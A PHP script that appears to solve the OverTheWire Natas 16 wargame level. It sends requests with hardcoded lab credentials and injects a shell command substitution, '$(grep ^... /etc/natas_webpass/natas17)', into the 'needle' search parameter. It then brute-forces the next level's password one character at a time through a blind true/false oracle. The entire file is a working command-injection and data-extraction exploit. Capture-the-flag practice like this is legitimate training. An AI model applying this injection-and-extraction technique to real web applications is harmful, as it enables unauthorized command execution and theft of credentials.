<?php
use GuzzleHttp\Client;
require 'vendor/autoload.php';
$http = new Client();

/**
 * @param Client $http
 * @param string $cmd
 * @return bool|null
 */
function oracle(Client $http, $cmd = '1'): ?bool
{
    $request = $http->get(
        'http://natas16.natas.labs.overthewire.org/index.php?' . http_build_query(['needle' => $cmd]),
        [
            'auth' => ['natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'],
        ]
    );
    $response = $request->getBody() . '';
    return strpos($response, 'November') === false;
}

$prefix = 'November$(grep ^';
$suffix = ' /etc/natas_webpass/natas17)';

$charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' .
    'abcdefghijklmnopqrstuvwxyz' .
    '0123456789' .
    '+/' .
    '=';

$password = '';
for ($i = 0; $i < 32; ++$i) {
    for ($j = 0; $j < 65; ++$j) {
        $c = $charset[$j]; // ASCII char

        if ($i === 0 && $j === 64) {
            var_dump($prefix . $password . $c . $suffix);
        }
        if (oracle($http, $prefix . $password . $c . $suffix)) {
            $password .= $c;
            echo "{$password}\n";
            break;
        }
    }
}
var_dump($password);
